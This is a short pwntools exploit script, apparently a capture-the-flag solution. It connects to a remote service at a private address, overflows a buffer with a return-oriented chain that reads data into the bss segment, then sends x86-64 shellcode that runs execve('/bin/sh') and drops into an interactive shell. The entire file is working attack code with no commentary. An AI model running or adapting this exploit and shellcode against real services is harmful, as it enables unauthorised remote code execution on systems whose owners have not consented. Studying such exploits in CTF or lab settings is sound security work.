from pwn import *
context.arch='amd64'
#context.log_level='debug'
#p=process("./main")
p=remote("10.21.13.190",2600)
read=0x000000000400440
rdi=0x0000000000400613
rsi=0x0000000000400611
bss=0x00601000+0x200
p.sendline("A"*0x10+p64(0)+p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(0)+p64(read)+p64(bss))
sleep(1)
shellcode='''
xor rax,rax
mov al,0x3b
xor rdx,rdx
xor rsi,rsi
mov rdi,0x68732f6e69622f
push rdi
mov rdi,rsp
syscall
'''
p.sendline(asm(shellcode))
p.interactive()
